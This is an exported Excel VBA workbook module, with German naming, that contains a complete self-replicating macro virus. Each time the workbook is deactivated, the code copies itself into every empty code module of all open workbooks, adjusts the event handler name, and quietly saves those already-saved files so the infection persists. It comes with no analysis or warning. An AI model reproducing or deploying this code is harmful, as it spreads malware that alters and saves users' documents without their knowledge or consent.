   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "DieseArbeitsmappe"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Workbook_Deactivate()

   Dim OurCode, ThaClass As String
   Dim i As Integer
   Dim Saved As Boolean

   ThaClass = "DieseArbeitsmappe"

   OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

   For i = 1 To Application.Workbooks.Count

     Saved = False

     For j = 1 To Application.Workbooks.Item(i).VBProject.VBComponents.Count

       If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines = 0 Then

         If Application.Workbooks.Item(i).Path <> "" And Application.Workbooks.Item(i).Saved = True And Saved = False Then Saved = True

         Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.InsertLines 1, OurCode

         If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).Name = ThaClass Then
           Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Workbook_Deactivate()"
         Else
           Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Worksheet_Deactivate()"
         End If

       End If

     Next j

     If Saved = True Then Application.Workbooks.Item(i).Save

   Next i

   End Sub
